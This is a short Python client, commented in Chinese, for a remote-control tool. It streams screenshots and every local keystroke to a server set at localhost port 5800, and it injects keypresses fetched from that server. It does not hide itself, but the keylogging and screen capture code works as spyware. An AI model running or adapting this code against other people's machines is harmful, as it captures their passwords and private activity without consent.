import time, uuid, threading, requests
from pynput import keyboard
from pynput.keyboard import Key, Controller
import mss, io, sys
from PIL import Image

SERVER = "http://127.0.0.1:5800"
CID = str(uuid.uuid4())[:8]
KEY = Controller()

# 极速截图上传 无任何休眠 无限制
def upload_screen():
    with mss.mss() as sct:
        while True:
            try:
                screen = sct.grab(sct.monitors[0])
                im = Image.frombytes("RGB", screen.size, screen.bgra, "raw", "BGRX")
                buf = io.BytesIO()
                im.save(buf, "JPEG", quality=40)
                buf.seek(0)
                requests.post(f"{SERVER}/upload/screen",
                    data={"client_id": CID},
                    files={"screen": buf},
                    timeout=1)
            except:
                pass

# 心跳 500ms
def heartbeat():
    while True:
        try: requests.post(f"{SERVER}/heartbeat", json={"client_id":CID}, timeout=1)
        except: pass
        time.sleep(0.5)

# 远程按键
def remote_cmd():
    while True:
        try:
            r = requests.post(f"{SERVER}/get_cmds", json={"client_id":CID}, timeout=1)
            for key in r.json()["cmds"]:
                try:
                    if len(key) == 1:
                        KEY.press(key); KEY.release(key)
                    else:
                        k = getattr(Key, key)
                        KEY.press(k); KEY.release(k)
                except: pass
        except: pass
        time.sleep(0.02)

# 本地键盘
def on_press(k):
    try: s = k.char
    except: s = str(k).replace("Key.", "")
    try: requests.post(f"{SERVER}/upload/key", json={"client_id":CID,"key":s}, timeout=1)
    except: pass

if __name__ == "__main__":
    print(f"客户端ID: {CID}")
    if sys.platform == "darwin":
        print("Mac 请开启辅助功能权限")
    
    threading.Thread(target=heartbeat, daemon=True).start()
    threading.Thread(target=upload_screen, daemon=True).start()
    threading.Thread(target=remote_cmd, daemon=True).start()
    with keyboard.Listener(on_press=on_press) as lst: lst.join()